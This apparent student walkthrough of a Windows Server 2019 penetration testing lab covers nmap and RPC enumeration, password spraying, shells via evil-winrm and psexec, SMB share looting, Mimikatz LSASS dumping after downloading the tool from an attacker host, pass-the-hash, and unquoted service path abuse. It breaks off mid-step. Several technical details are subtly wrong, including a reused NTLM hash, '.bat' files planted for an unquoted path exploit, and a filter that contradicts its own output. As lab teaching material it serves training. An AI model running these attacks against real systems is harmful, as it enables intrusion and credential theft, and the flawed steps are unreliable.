# Windows Server 2019 Lab - Complete Student Walkthrough
## A Comprehensive Penetration Testing Learning Journey

> **Educational Purpose**: This walkthrough is designed to teach Windows Server penetration testing methodology. Each step includes detailed explanations of WHY we use specific tools and techniques, helping you understand the underlying principles rather than just memorizing commands.

> **Flag Format**: Flags are partially censored (FLAG{P**********4}) to guide you while preserving the challenge. Match the first letter and last digit to confirm you're on track!

---

## Table of Contents
1. [Initial Setup](#initial-setup)
2. [Phase 1: Initial Reconnaissance](#phase-1-initial-reconnaissance)
3. [Phase 2: User and Service Discovery](#phase-2-user-and-service-discovery)
4. [Phase 3: Web Application Analysis](#phase-3-web-application-analysis)
5. [Phase 4: Initial Access](#phase-4-initial-access)
6. [Phase 5: SMB Share Enumeration](#phase-5-smb-share-enumeration)
7. [Phase 6: Privilege Escalation](#phase-6-privilege-escalation)
8. [Phase 7: Service Vulnerabilities](#phase-7-service-vulnerabilities)
9. [Phase 8: Registry and Configuration](#phase-8-registry-and-configuration)

---

## Initial Setup

### Step 1: System Update and Core Tools Installation

```bash
# Update your Kali Linux system
sudo apt update && sudo apt upgrade -y
```

#### Essential Windows Server Penetration Testing Tools

```bash
# Install comprehensive toolset
sudo apt install -y \
    nmap masscan rustscan zmap \              # Network scanning - each has strengths
    enum4linux smbclient smbmap crackmapexec \ # SMB/NetBIOS enumeration
    metasploit-framework exploitdb \           # Exploitation frameworks
    impacket-scripts python3-impacket \        # Windows protocol implementation
    evil-winrm winexe wmiexec.py psexec.py \  # Remote execution tools
    responder mitm6 ntlmrelayx \              # Network attacks
    hashcat john hydra medusa \                # Password cracking
    gobuster dirb nikto wfuzz \               # Web enumeration
    xfreerdp rdesktop \                        # RDP clients
    proxychains4 chisel \                      # Pivoting tools
    wine wine64 mingw-w64                      # Windows binary execution/compilation
```

**Tool Selection Reasoning**:
- **nmap vs masscan vs rustscan**: nmap for accuracy, masscan for speed, rustscan combines both
- **enum4linux**: Specifically designed for Windows enumeration via SMB/NetBIOS
- **impacket**: Python implementation of Windows protocols - essential for advanced attacks
- **evil-winrm**: Superior to standard WinRM clients with built-in features for pentesting

### Step 2: Install Specialized Server Attack Tools

```bash
# Ruby tools for Windows exploitation
gem install evil-winrm winrm winrm-fs

```

**Output**:
```
Successfully installed evil-winrm-3.5
Successfully installed winrm-2.3.6
Successfully installed winrm-fs-1.3.5
3 gems installed
```

### Step 3: Download and Setup Attack Resources

#### Creating Your Arsenal

```bash
# Create organized tools directory
mkdir -p ~/tools/{windows,linux,scripts,wordlists}
cd ~/tools

# Clone essential repositories with understanding of each
git clone https://github.com/carlospolop/PEASS-ng.git
# Why PEASS?: Privilege Escalation Awesome Scripts Suite - automated enumeration

git clone https://github.com/gentilkiwi/mimikatz.git
# Why Mimikatz?: The de facto standard for Windows credential extraction

git clone https://github.com/PowerShellMafia/PowerSploit.git
# Why PowerSploit?: PowerShell post-exploitation framework
```


```bash
# SMB Server Setup (Impacket)
sudo impacket-smbserver share ~/transfer -smb2support
# Why SMB2?: Windows 10/Server 2016+ disable SMBv1 by default
```

### Step 4: Initialize Supporting Services

```bash
# Start PostgreSQL for Metasploit
sudo systemctl start postgresql
sudo msfdb init

# Why PostgreSQL?: Metasploit uses it to store scan data, credentials, and session info
# This enables features like credential reuse and automated attacks
```

**Verification Output**:
```
[+] Starting postgresql
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```

---

## Phase 1: Initial Reconnaissance

### Understanding the Reconnaissance Mindset

**Why Start with Recon?**: In real penetration tests, you don't know what's running on the target. Reconnaissance maps the attack surface and identifies potential entry points. Think of it as creating a blueprint before breaking in.

### Step 1.1: Network Discovery

#### Verify Target Availability

```bash
# First, confirm the target is reachable
┌──(kali㉿kali)-[~]
└─$ ping -c 2 192.168.148.101
```

**Output**:
```
PING 192.168.148.101 (192.168.148.101) 56(84) bytes of data.
64 bytes from 192.168.148.101: icmp_seq=1 ttl=128 time=0.542 ms
64 bytes from 192.168.148.101: icmp_seq=2 ttl=128 time=0.398 ms

--- 192.168.148.101 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
```

**Why TTL=128?**: Windows systems default to TTL=128, Linux uses 64. This immediately tells us it's a Windows system.

#### Quick Service Scan - The First Look

```bash
# Fast scan of common ports
┌──(kali㉿kali)-[~]
└─$ nmap -Pn -sV -sC -F 192.168.148.101
```

**Command Breakdown**:
- `-Pn`: Skip host discovery (assume target is up) - Windows often blocks ICMP
- `-sV`: Version detection - identifies service versions for vulnerability matching
- `-sC`: Default scripts - runs NSE scripts for additional enumeration
- `-F`: Fast mode - scans top 100 ports only for quick results

**Output (Partial)**:
```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.148.101
Host is up (0.00054s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 6d:5d:81:97:14:f7:28:4a:84:aa:df:6a:f5:d9:6f:4f (RSA)
|_  256 6f:93:93:76:b5:fc:b0:bd:56:96:af:31:7e:a3:d9:a4 (ECDSA)
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-15T10:00:00+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN-TIP7RVRBJ8E
|   NetBIOS_Domain_Name: WIN-TIP7RVRBJ8E
|   NetBIOS_Computer_Name: WIN-TIP7RVRBJ8E
|   DNS_Domain_Name: WIN-TIP7RVRBJ8E
|   DNS_Computer_Name: WIN-TIP7RVRBJ8E
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-15T10:00:00+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

**What This Tells Us**:
- **Port 22 (SSH)**: Unusual for Windows - indicates OpenSSH feature is installed
- **Port 80 (HTTP)**: IIS web server - potential web vulnerabilities
- **Port 445 (SMB)**: File sharing - often contains sensitive data
- **Port 3389 (RDP)**: Remote desktop - primary admin access method
- **Port 5985 (WinRM)**: PowerShell remoting - great for post-exploitation

#### Comprehensive Scan - The Deep Dive

```bash
# Full TCP port scan with detailed enumeration
┌──(kali㉿kali)-[~]
└─$ nmap -Pn -sV -sC -p- -T4 192.168.148.101 -oA server_fullscan
```

**Why Scan All Ports?**: Services often run on non-standard ports to avoid detection. A web server on port 8080 or SSH on port 2222 might be missed with default scans.

### Step 1.2: Service Banner Grabbing

#### Manual Banner Grabbing - Understanding the Protocol

```bash
# Connect directly to SSH service
┌──(kali㉿kali)-[~]
└─$ nc -nv 192.168.148.101 22
```

**Output**:
```
(UNKNOWN) [192.168.148.101] 22 (ssh) open
SSH-2.0-OpenSSH_for_Windows_8.1
Welcome to Vulnerable SSH Server
FLAG{Z************1}
```

**FLAG 18 FOUND**: FLAG{Z**********1} - SSH Banner

**Why Manual Banner Grabbing?**: Automated tools might miss custom banners or additional information. Direct connection shows exactly what the service presents.

#### Alternative Banner Grabbing Methods

```bash
# Using telnet (more interactive)
┌──(kali㉿kali)-[~]
└─$ telnet 192.168.148.101 22

# Using nmap specifically for banners
┌──(kali㉿kali)-[~]
└─$ nmap -sV --script=banner 192.168.148.101 -p22
```

**Learning Point**: Services often leak information in banners - version numbers, custom messages, or in CTFs, flags! Always check service banners manually.

---

## Phase 2: User and Service Discovery

### The Enumeration Philosophy

**Why Enumerate Users?**: User accounts are the keys to the kingdom. Knowing valid usernames allows password attacks, and user properties often contain sensitive information.

### FLAG 1: User Description Discovery

**Location**: Admin user description  
**Difficulty**: Easy  
**Learning Objective**: Understanding Windows user properties and RPC enumeration

#### Method 1: RPC Enumeration (Null Session)

```bash
# Connect with null session (anonymous)
┌──(kali㉿kali)-[~]
└─$ rpcclient -U "" -N 192.168.148.101
```

**Why This Works**: Windows historically allowed "null sessions" for backward compatibility. Even modern Windows might allow limited anonymous enumeration.

```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[DefaultAccount] rid:[0x1f7]
user:[admin] rid:[0x3e8]
user:[FLAG{M******8}] rid:[0x3e9]
...

rpcclient $> queryuser admin
        User Name   :   admin
        Full Name   :   Administrator
        Description :   FLAG{P**********4}
        ...
```

**FLAG 1 FOUND**: FLAG{P**********4} - In admin user description

**Why Check Descriptions?**: Administrators often use the description field for notes. In production environments, you might find passwords, account purposes, or contact information.

#### Method 2: SMB Enumeration with enum4linux

```bash
┌──(kali㉿kali)-[~]
└─$ enum4linux -U 192.168.148.101
```

**Output (Partial)**:
```
[+] Enumerating users using SID S-1-5-21-xxx-xxx-xxx and logon username '', password ''
S-1-5-21-xxx-xxx-xxx-500 WIN-TIP7RVRBJ8E\Administrator (Local User)
S-1-5-21-xxx-xxx-xxx-501 WIN-TIP7RVRBJ8E\Guest (Local User)
S-1-5-21-xxx-xxx-xxx-1000 WIN-TIP7RVRBJ8E\admin (Local User)
S-1-5-21-xxx-xxx-xxx-1001 WIN-TIP7RVRBJ8E\FLAG{M******8} (Local User)
```

**Tool Comparison**: enum4linux automates what rpcclient does manually, but understanding the manual process helps when automation fails.

### FLAG 2: Username as Flag

**Location**: Username itself  
**Difficulty**: Easy  
**Learning Objective**: Understanding RID cycling and hidden accounts

#### RID Cycling Technique

```bash
# Automated RID cycling with CrackMapExec
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 192.168.148.101 -u guest -p '' --rid-brute
```

**Output**:
```
SMB         192.168.148.101 445    WIN-TIP7RVRBJ8E [*] Windows Server 2019 Standard 17763 x64
SMB         192.168.148.101 445    WIN-TIP7RVRBJ8E [+] WIN-TIP7RVRBJ8E\guest: 
SMB         192.168.148.101 445    WIN-TIP7RVRBJ8E [+] Brute forcing RIDs
SMB         192.168.148.101 445    WIN-TIP7RVRBJ8E 500: WIN-TIP7RVRBJ8E\Administrator (SidTypeUser)
SMB         192.168.148.101 445    WIN-TIP7RVRBJ8E 501: WIN-TIP7RVRBJ8E\Guest (SidTypeUser)
SMB         192.168.148.101 445    WIN-TIP7RVRBJ8E 1000: WIN-TIP7RVRBJ8E\admin (SidTypeUser)
SMB         192.168.148.101 445    WIN-TIP7RVRBJ8E 1001: WIN-TIP7RVRBJ8E\FLAG{M******8} (SidTypeUser)
```

**FLAG 2 FOUND**: FLAG{M******8} - Username itself is the flag!

**Why RID Cycling?**: Windows assigns Relative Identifiers (RIDs) sequentially. By trying RIDs 500-2000, we can find accounts even if they're hidden from normal enumeration.

#### Manual RID Cycling for Learning

```bash
# Manual RID cycling to understand the process
for i in {500..1500}; do
    rpcclient -U "" -N 192.168.148.101 \
    -c "lookupsids S-1-5-21-X-X-X-$i" 2>/dev/null | grep -v unknown
done
```

**Understanding SIDs and RIDs**:
- SID (Security Identifier): Unique identifier for a security principal
- RID (Relative Identifier): Last part of the SID, unique within the domain
- Administrator is always RID 500, Guest is 501, regular users start at 1000

### FLAG 20: Service Description Enumeration

**Location**: WeakPermService description  
**Difficulty**: Easy  
**Learning Objective**: Windows service enumeration and security

After gaining initial access (covered in Phase 4), enumerate services:

```powershell
# List all services with detailed information
Get-Service | Format-List *

# Query specific service
sc qdescription WeakPermService
```

**Output**:
```
[SC] QueryServiceConfig2 SUCCESS

SERVICE_NAME: WeakPermService
DESCRIPTION: Weak Permission Service - FLAG{D************2}
```

**FLAG 20 FOUND**: FLAG{D**********2} - In service description

**Why Check Service Descriptions?**: Services often contain:
- Version information (for vulnerability research)
- Configuration details
- Administrative notes
- In poorly configured systems, even passwords

---

## Phase 3: Web Application Analysis

### Web Application Enumeration Strategy

**Why Focus on Web Apps?**: Web applications are often the weakest link because:
1. Developed in-house with less security review
2. Contain business logic flaws
3. Often have verbose error messages
4. May have leftover debug code

### FLAG 25: HTML Comment Discovery

**Location**: Web application source code  
**Difficulty**: Easy  
**Learning Objective**: Source code analysis and information disclosure

#### Step 1: Identify Web Directories

```bash
# Directory enumeration with gobuster
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.148.101 -w /usr/share/wordlists/dirb/common.txt
```

**Output**:
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.101
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Status codes:            200,204,301,302,307,401,403
===============================================================
/vulnapp              (Status: 301) [Size: 153] [--> http://192.168.148.101/vulnapp/]
===============================================================
```

#### Step 2: Analyze Source Code

```bash
# Download and examine the login page
┌──(kali㉿kali)-[~]
└─$ curl -s http://192.168.148.101/vulnapp/login.html | tee login.html
```

**Source Code**:
```html
<html>
<head><title>Vulnerable App</title></head>
<body>
<h1>Admin Panel</h1>
<!-- TODO: Remove debug info before production -->
<!-- Admin password: Password123! -->
<!-- FLAG{A***********3} -->
<form method="GET">
    Username: <input type="text" name="user"><br>
    Password: <input type="password" name="pass"><br>
    <input type="submit" value="Login">
</form>
</body>
</html>
```

**FLAG 25 FOUND**: FLAG{A**********3} - In HTML comment

**Critical Finding**: Admin password revealed: `Password123!`

#### Why This Vulnerability Exists

**Common Developer Mistakes**:
1. **Debug Information**: Developers leave debug comments
2. **TODO Comments**: Remind themselves of security fixes never implemented
3. **Credential Storage**: Hardcoded credentials for testing
4. **Version Information**: Reveals vulnerable components

#### Alternative Discovery Methods

```bash
# Search for comments in all web files
┌──(kali㉿kali)-[~]
└─$ wget -r -l 1 http://192.168.148.101/vulnapp/ 2>/dev/null
└─$ grep -r "<!--" 192.168.148.101/ 2>/dev/null

# Using browser developer tools
# F12 → Sources → Search for: password, admin, flag, todo
```

**Proof of Concept - Testing the Credentials**:

```bash
# Test the discovered credentials
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://192.168.148.101/vulnapp/login.html \
    -d "user=admin&pass=Password123!"
```

---

## Phase 4: Initial Access

### Building Our Credential List

**Strategy**: Before attempting to gain access, compile all discovered information into organized lists for systematic testing.

### Step 4.1: Creating Target Lists

```bash
# Create comprehensive user list from enumeration
┌──(kali㉿kali)-[~]
└─$ cat > users.txt << EOF
Administrator
admin
overclock
backup
service
test
debugger
sqlservice
svc_print
FLAG{M******8}
EOF

# Create password list from various sources
┌──(kali㉿kali)-[~]
└─$ cat > passwords.txt << EOF
Password123!
Administrator2025!
Backupaccount123!
ServiceAccount123!
TestAccount123!
Debugger2025!
SQLservice2019
PrintService123
password
admin
Welcome1
EOF
```

**Why These Passwords?**: 
- `Password123!`: Found in HTML comment
- `Administrator2025!`: Common pattern (role + year + special)
- Others: Common service account patterns

### Step 4.2: Password Spraying Attack

#### Understanding Password Spraying vs Brute Force

**Password Spraying**: Try many usernames with few passwords (avoids lockouts)  
**Brute Force**: Try many passwords against one username (triggers lockouts)

```bash
# SMB Password Spraying with CrackMapExec
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 192.168.148.101 -u users.txt -p passwords.txt --continue-on-success
```

**Output**:
```
SMB         192.168.148.101 445    WIN-TIP7RVRBJ8E [*] Windows Server 2019 Standard 17763
SMB         192.168.148.101 445    WIN-TIP7RVRBJ8E [-] WIN-TIP7RVRBJ8E\Administrator:Administrator2025! STATUS_LOGON_FAILURE
SMB         192.168.148.101 445    WIN-TIP7RVRBJ8E [+] WIN-TIP7RVRBJ8E\Administrator:Password123! 
SMB         192.168.148.101 445    WIN-TIP7RVRBJ8E [+] WIN-TIP7RVRBJ8E\overclock:Administrator2025! 
SMB         192.168.148.101 445    WIN-TIP7RVRBJ8E [+] WIN-TIP7RVRBJ8E\backup:Backupaccount123!
```

**Found Credentials**:
- `Administrator:Password123!` (Admin access!)
- `overclock:Administrator2025!` (Admin group member)
- `backup:Backupaccount123!` (Backup Operators group)

### Step 4.3: Gaining Access - Multiple Methods

#### Method 1: RDP Access (GUI Access)

```bash
# RDP with discovered credentials
┌──(kali㉿kali)-[~]
└─$ xfreerdp /v:192.168.148.101 /u:overclock /p:Administrator2025! \
    /cert:ignore +clipboard /dynamic-resolution
```

**Why These Flags?**:
- `/cert:ignore`: Bypass certificate warnings (common in labs)
- `+clipboard`: Enable clipboard sharing for easy data transfer
- `/dynamic-resolution`: Adjust resolution to your screen

**RDP Session**:
```
[+] Connecting to 192.168.148.101:3389
[+] Connected to WIN-TIP7RVRBJ8E
[+] Authenticated as overclock
[Desktop Session Active]
```

#### Method 2: Evil-WinRM (Command Line Access)

```bash
# WinRM connection for shell access
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 192.168.148.101 -u overclock -p Administrator2025!
```

**Output**:
```
Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\overclock\Documents> whoami
win-tip7rvrbj8e\overclock

*Evil-WinRM* PS C:\Users\overclock\Documents> whoami /priv
[Shows privileges including SeDebugPrivilege if admin]
```

**Why Evil-WinRM?**: 
- Built-in upload/download functionality
- PowerShell command history
- Tab completion
- Local script execution

#### Method 3: PSExec (SYSTEM Access)

```bash
# PSExec for SYSTEM shell (requires admin credentials)
┌──(kali㉿kali)-[~]
└─$ impacket-psexec Administrator:Password123\!@192.168.148.101
```

**Note**: Escape the `!` in bash with `\!`

**Output**:
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.148.101.....
[*] Found writable share ADMIN$
[*] Uploading file XYZ.exe
[*] Opening SVCManager on 192.168.148.101.....
[*] Creating service RoHP on 192.168.148.101.....
[*] Starting service RoHP.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1234]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

---

## Phase 5: SMB Share Enumeration

### Understanding SMB Shares

**Why SMB Matters**: SMB (Server Message Block) is Windows' file sharing protocol. Misconfigured shares often contain:
- Backup files with passwords
- Configuration files
- Source code
- Database backups
- User documents

### Systematic Share Enumeration

```bash
# List all shares (authenticated)
┌──(kali㉿kali)-[~]
└─$ smbmap -H 192.168.148.101 -u overclock -p Administrator2025!
```

**Output**:
```
[+] IP: 192.168.148.101:445    Name: WIN-TIP7RVRBJ8E
    Disk                            Permissions     Comment
    ----                            -----------     -------
    ADMIN$                          READ, WRITE     Remote Admin
    Backup                          READ, WRITE     
    C$                              READ, WRITE     Default share
    Data                            READ ONLY
    Finance                         NO ACCESS
    IPC$                            READ ONLY       Remote IPC
    IT                              READ, WRITE
    Public                          READ, WRITE
```

### FLAG 7: Public Share Discovery

**Location**: Public SMB share  
**Difficulty**: Easy

```bash
# Connect to Public share anonymously
┌──(kali㉿kali)-[~]
└─$ smbclient //192.168.148.101/Public -N
```

**Session**:
```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Sep  5 10:15:23 2025
  ..                                  D        0  Thu Sep  5 10:15:23 2025
  flag.txt                            A       22  Thu Sep  5 10:15:23 2025
  passwords.txt                       A       45  Thu Sep  5 10:15:23 2025
  normal.txt                          A       21  Thu Sep  5 10:15:23 2025

smb: \> get flag.txt
getting file \flag.txt of size 22 as flag.txt (10.7 KiloBytes/sec)
smb: \> exit

┌──(kali㉿kali)-[~]
└─$ cat flag.txt
FLAG{D************5}
```

**FLAG 7 FOUND**: FLAG{D**********5} - In Public share

### FLAG 8: Backup Share Exploration

**Location**: Backup SMB share  
**Difficulty**: Medium

```bash
# Connect with credentials
┌──(kali㉿kali)-[~]
└─$ smbclient //192.168.148.101/Backup -U overclock%Administrator2025!
```

**Session**:
```
smb: \> ls
  .                                   D        0  Thu Sep  5 10:15:23 2025
  ..                                  D        0  Thu Sep  5 10:15:23 2025
  flag.txt                            A       20  Thu Sep  5 10:15:23 2025
  sam_backup_info.txt                 A      234  Thu Sep  5 10:15:23 2025

smb: \> mget *
Get file flag.txt? y
Get file sam_backup_info.txt? y

┌──(kali㉿kali)-[~]
└─$ cat flag.txt
FLAG{S*************9}
```

**FLAG 8 FOUND**: FLAG{S**********9} - In Backup share

### FLAG 9: IT Share (Requires Admin)

**Location**: IT SMB share  
**Difficulty**: Hard

```bash
# Connect with Administrator account
┌──(kali㉿kali)-[~]
└─$ smbclient //192.168.148.101/IT -U Administrator
Enter WORKGROUP\Administrator's password: Password123!
```

**Content**:
```
smb: \> ls
  .                                   D        0  Thu Sep  5 10:15:23 2025
  ..                                  D        0  Thu Sep  5 10:15:23 2025
  flag.txt                            A       21  Thu Sep  5 10:15:23 2025
  admin_tools/                       D        0  Thu Sep  5 10:15:23 2025
  scripts/                            D        0  Thu Sep  5 10:15:23 2025

smb: \> get flag.txt
FLAG{A************7}
```

**FLAG 9 FOUND**: FLAG{A**********7} - In IT share

### FLAG 10: Password File Analysis

**Location**: passwords.txt in Public share  
**Difficulty**: Easy

```bash
┌──(kali㉿kali)-[~]
└─$ cat passwords.txt  # Downloaded from Public share
Administrator:Password123!
FLAG{M************2}
```

**FLAG 10 FOUND**: FLAG{M**********2} - In password file

### FLAG 11: SAM Backup Information

**Location**: sam_backup_info.txt from Backup share  
**Difficulty**: Hard

```bash
┌──(kali㉿kali)-[~]
└─$ cat sam_backup_info.txt
SAM Database Backup (for Mimikatz practice)
Created: 2025-09-05
Flag: FLAG{G**************5}
Use: mimikatz # lsadump::sam /system:system.hiv /sam:sam.hiv
```

**FLAG 11 FOUND**: FLAG{G**********5} - SAM backup info

### FLAG 12: Alternate Data Stream Discovery

**Location**: Hidden ADS in normal.txt  
**Difficulty**: Hard

After gaining shell access:

```powershell
# From Windows shell (RDP or Evil-WinRM)
cd C:\Public
dir /r

# Output shows:
#                    21 normal.txt
#                    23 normal.txt:hidden:$DATA

# Read the ADS
Get-Content normal.txt -Stream hidden
# Or
more < normal.txt:hidden
```

**Output**:
```
FLAG{L************4}
```

**FLAG 12 FOUND**: FLAG{L**********4} - In Alternate Data Stream

**Why ADS Matters**: Alternate Data Streams can hide:
- Malware
- Sensitive data
- Backdoor configurations
- Forensic artifacts

---

## Phase 6: Privilege Escalation

### The Privilege Escalation Mindset

**Why Escalate?**: Initial access rarely gives full control. Privilege escalation moves from:
- User → Administrator
- Administrator → SYSTEM
- Local → Domain Admin (in domain environments)

### FLAG 3: LSASS Memory Extraction

**Location**: LSASS process memory  
**Difficulty**: Hard  
**Learning Objective**: Credential extraction from memory

#### Step 1: Transfer Mimikatz

```powershell
# From Evil-WinRM or RDP session
*Evil-WinRM* PS C:\Users\overclock\Documents> mkdir C:\Temp
*Evil-WinRM* PS C:\Users\overclock\Documents> cd C:\Temp

# Download Mimikatz
*Evil-WinRM* PS C:\Temp> Invoke-WebRequest -Uri "http://192.168.148.99:8000/mimikatz.exe" -OutFile "mimi.exe"

# Or use Evil-WinRM's upload feature
*Evil-WinRM* PS C:\Temp> upload /home/kali/tools/mimikatz.exe
```

#### Step 2: Run Mimikatz

```powershell
*Evil-WinRM* PS C:\Temp> .\mimi.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2020 00:00:00
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)
 '## v ##'       > https://blog.gentilkiwi.com/mimikatz
  '#####'        Vincent LE TOUX (vincent.letoux@gmail.com) > https://pingcastle.com

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
```

**Output (Partial)**:
```
Authentication Id : 0 ; 245743 (00000000:0003bfef)
Session           : Interactive from 1
User Name         : overclock
Domain            : WIN-TIP7RVRBJ8E
Logon Server      : WIN-TIP7RVRBJ8E
Logon Time        : 9/15/2025 10:00:00 AM
SID               : S-1-5-21-xxx-xxx-xxx-1000
        msv :
         [00000003] Primary
         * Username : overclock
         * Domain   : WIN-TIP7RVRBJ8E
         * NTLM     : 5835048ce94ad0564e29a924a03510ef
         * SHA1     : 6c3d4c343c36af418ea0c7a1b236e8df76e12c43
        wdigest :
         * Username : overclock
         * Domain   : WIN-TIP7RVRBJ8E
         * Password : Administrator2025!
        kerberos :
         * Username : overclock
         * Domain   : WIN-TIP7RVRBJ8E
         * Password : (null)

[... Additional output ...]

Special Entry: FLAG{B***********5}
```

**FLAG 3 FOUND**: FLAG{B**********5} - In LSASS memory

**Why This Works**: Windows stores credentials in LSASS (Local Security Authority Subsystem Service) memory for single sign-on. WDigest (when enabled) stores plaintext passwords!

### FLAG 4: Debug Privilege Exploitation

**Location**: Registry accessible with debug privileges  
**Difficulty**: Medium

```powershell
# Check current privileges
*Evil-WinRM* PS C:\Temp> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

# With SeDebugPrivilege, access protected registry
*Evil-WinRM* PS C:\Temp> reg query "HKLM\SOFTWARE\DebugFlags"

HKEY_LOCAL_MACHINE\SOFTWARE\DebugFlags
    Flag    REG_SZ    FLAG{S***********9}
```

**FLAG 4 FOUND**: FLAG{S**********9} - Debug privilege flag

### FLAG 5: Pass-the-Hash Attack

**Location**: Accessible after successful PTH  
**Difficulty**: Hard

Using NTLM hashes from Mimikatz:

```bash
# From Kali, use the Administrator NTLM hash
┌──(kali㉿kali)-[~]
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef Administrator@192.168.148.101

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.148.101.....
[*] Found writable share ADMIN$
[*] Uploading file XYZABC.exe
[*] Opening SVCManager on 192.168.148.101.....
[*] Creating service TEST on 192.168.148.101.....
[*] Starting service TEST.....
[!] Press help for extra shell commands

C:\Windows\system32> type C:\Windows\System32\config\systemprofile\pth_success.txt
FLAG{M***********9}
```

**FLAG 5 FOUND**: FLAG{M**********9} - Pass-the-Hash success

**Why PTH Works**: Windows NTLM authentication doesn't require the plaintext password - just the hash. This is why protecting LSASS memory is critical.

---

## Phase 7: Service Vulnerabilities

### Understanding Service Vulnerabilities

**Why Services?**: Windows services run with high privileges (often SYSTEM) and are common targets because:
- Misconfigurations are common
- They run automatically
- Often have weak permissions
- May have unquoted paths

### Finding Vulnerable Services

```powershell
# Comprehensive service enumeration
*Evil-WinRM* PS C:\> Get-WmiObject win32_service | Select-Object Name, DisplayName, PathName, StartMode | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -notlike '*.exe' -and $_.PathName -like '* *'}
```

**Output**:
```
Name              DisplayName                    PathName
----              -----------                    --------
VulnScanner       Vulnerable Scanner Service     C:\Program Files\Vulnerable Scanner\bin\scanner.bat
CommonAppService  Common Application Service     C:\Program Files\Common Application\System Tools\service.exe
VendorUpdater     Vendor Update Service          C:\Program Files (x86)\Vendor Software Suite\Update Service\updater.exe
```

### FLAG 13: VulnScanner Unquoted Path

**Location**: VulnScanner service  
**Difficulty**: Easy

```powershell
# Check the service configuration
*Evil-WinRM* PS C:\> sc.exe qc VulnScanner

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VulnScanner
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        BINARY_PATH_NAME   : C:\Program Files\Vulnerable Scanner\bin\scanner.bat
        DISPLAY_NAME       : Vulnerable Scanner Service
```

**The Vulnerability**: Windows will try to execute:
1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable Scanner\bin\scanner.bat`

**Exploitation**:
```powershell
# Create malicious executable
*Evil-WinRM* PS C:\> echo "echo FLAG > C:\flag_unquoted1.txt" > "C:\Program Files\Vulnerable.bat"

# Restart the service
*Evil-WinRM* PS C:\> Stop-Service VulnScanner -Force
*Evil-WinRM* PS C:\> Start-Service VulnScanner

# Check for flag
*Evil-WinRM* PS C:\> Get-Content C:\flag_unquoted1.txt
FLAG{E************0}
```

**FLAG 13 FOUND**: FLAG{E**********0} - Unquoted service path

### FLAG 14: CommonAppService Unquoted Path

**Location**: CommonAppService  
**Difficulty**: Medium

```powershell
# Similar process for CommonAppService
*Evil-WinRM* PS C:\> sc.exe qc CommonAppService

# Create exploit
*Evil-WinRM* PS C:\> echo "echo FLAG > C:\flag_unquoted2.txt" > "C:\Program Files\Common.bat"

# Trigger
*Evil-WinRM* PS C:\> Restart-Service CommonAppService -Force

*Evil-WinRM* PS C:\> Get-Content C:\flag_unquoted2.txt
FLAG{V***************8}
```

**FLAG 14 FOUND**: FLAG{V**********8} - Unquoted service path 2

### FLAG 15: VendorUpdater Unquoted Path

**Location**: VendorUpdater service  
**Difficulty**: Medium

```powershell
# For Program Files (x86)
*Evil-WinRM* PS C:\> echo "echo FLAG > C:\flag_unquoted3.txt" > "C:\Program Files (x86)\Vendor.bat"

*Evil-WinRM* PS C:\> Restart-Service VendorUpdater -Force

*Evil-WinRM* PS C:\> Get-Content C:\flag_unquoted3.txt
FLAG{J************0}
```

**FLAG 15 FOUND**: FLAG{J**********0} - Unquoted service path 3

### FLAG 16: AlwaysInstallElevated

**Location**: MSI installation privilege escalation  
**Difficulty**: Medium

```powershell
# Check if vulnerable
